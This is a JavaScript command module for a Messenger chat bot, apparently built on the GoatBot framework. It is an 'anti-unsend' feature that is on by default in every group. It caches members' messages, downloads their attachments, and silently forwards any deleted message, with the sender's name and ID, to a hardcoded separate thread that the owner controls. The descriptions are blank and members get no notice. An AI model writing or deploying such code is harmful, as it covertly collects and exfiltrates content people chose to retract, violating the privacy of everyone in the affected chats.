const fs = require("fs-extra");
const path = require("path");

module.exports = {
  config: {
    name: "resend",
    version: "6.0",
    author: "NAFIJ PRO",
    countDown: 0,
    role: 0,
    shortDescription: { en: "_____&" },
    longDescription: { en: "______" },
    category: "Admin",
    guide: { en:  "__" }
  },

  onStart: async function({ threadsData, event, args, message, api }) {
    const ownerUID = "100058371606434";
    if (event.senderID !== ownerUID)
      return message.reply("😦🫶You are not authorized user.");

    const input = args[0]?.toLowerCase();
    if (!["on", "off"].includes(input)) {
      return message.reply("⚙️ Use `on` or `off` to control mode.");
    }

    const isEnable = input === "on";
    await threadsData.set(event.threadID, isEnable, "settings.reSend");
    return message.reply(
      isEnable ? "✅ setting has been enabled." : " setting has been disabled."
    );
  },

  onChat: async function({ api, event, threadsData, usersData }) {
    const notifyThreadID = "9856539844435742";

    let isEnabled = await threadsData.get(event.threadID, "settings.reSend");
    if (typeof isEnabled === "undefined") {
      isEnabled = true;
      await threadsData.set(event.threadID, true, "settings.reSend");
    }
    if (!isEnabled) return;

    if (!global.reSend) global.reSend = {};
    if (!global.reSend[event.threadID]) global.reSend[event.threadID] = [];

    if (event.type === "message") {
      global.reSend[event.threadID].push(event);
      if (global.reSend[event.threadID].length > 100) {
        global.reSend[event.threadID].shift();
      }

      // Save attachments to local
      if (event.attachments?.length) {
        for (const a of event.attachments) {
          const filePath = path.join(__dirname, "cache", `${event.messageID}_${a.filename || a.type}`);
          const stream = fs.createWriteStream(filePath);
          require("axios")({ url: a.url, responseType: "stream" })
            .then(res => res.data.pipe(stream))
            .catch(() => {});
        }
      }
    }

    if (event.type === "message_unsend") {
      const cached = global.reSend[event.threadID];
      const original = cached?.find(msg => msg.messageID === event.messageID);
      if (!original) return;

      const userName = await usersData.getName(original.senderID) || "Unknown user";
      const threadInfo = await api.getThreadInfo(event.threadID);
      const threadName = threadInfo?.threadName || "Unknown group";
      const unsendTime = new Date().toLocaleString("en-US", { timeZone: "Asia/Dhaka" });

      let msg = `🔒 𝗔𝗡𝗧𝗜-𝗨𝗡𝗦𝗘𝗡𝗗 𝗔𝗟𝗘𝗥𝗧 V1 🔒\n\n` +
        `👥 𝗚𝗿𝗼𝘂𝗽: ${threadName}\n🆔 𝗚𝗿𝗼𝘂𝗽 ID: ${event.threadID}\n` +
        `👤 𝗨𝘀𝗲𝗿: ${userName} (${original.senderID})\n` +
        `⏰ 𝗧𝗶𝗺𝗲: ${unsendTime}\n`;

      if (original.body) msg += `💬 𝗧𝗲𝘅𝘁: ${original.body}\n`;

      if (original.attachments?.length) {
        msg += `📎 𝗔𝘁𝘁𝗮𝗰𝗵𝗺𝗲𝗻𝘁𝘀: ${original.attachments.length}\n\n📤 𝗙𝗼𝗿𝘄𝗮𝗿𝗱𝗶𝗻𝗴...`;
        api.sendMessage(msg, notifyThreadID, () => {
          for (const a of original.attachments) {
            const filePath = path.join(__dirname, "cache", `${original.messageID}_${a.filename || a.type}`);
            if (fs.existsSync(filePath)) {
              const file = fs.createReadStream(filePath);
              api.sendMessage({ body: `📂 Attachment`, attachment: file }, notifyThreadID);
            }
          }
        });
        return;
      }

      return api.sendMessage(msg, notifyThreadID);
    }
  }
};
